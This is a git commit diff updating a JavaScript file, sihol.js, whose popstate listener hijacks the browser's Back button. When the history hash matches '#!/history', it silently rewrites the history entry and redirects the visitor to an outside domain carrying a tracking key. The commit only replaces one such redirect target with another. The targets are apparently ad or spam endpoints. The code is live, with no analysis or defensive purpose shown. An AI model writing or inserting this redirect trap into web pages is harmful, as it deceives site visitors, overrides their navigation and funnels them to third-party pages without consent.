ef5c40e4dfe2b5712a1a6849df45d5e2487a93f9
lookatdons <lookatdons@users.noreply.github.com>
2026-01-17 18:49:24 +0700

    Update sihol.js

--- sihol.js
+++ sihol.js
@@ -6,7 +6,7 @@ window.addEventListener("popstate", function() {
   if(location.hash === "#!/history") { 
     history.replaceState(null, document.title, location.pathname); 
     setTimeout(function(){ 
-      location.replace("https://kickhoistsuccess.com/dbci346e?key=785825480b5ae461f13a92d8e7518a82"); 
+      location.replace("https://forgottenoverlive.com/pm1ymmgxk3?key=399b8c1c420dbe0751ab7f618e873eb2"); 
     },10); 
   } 
 }, false); 
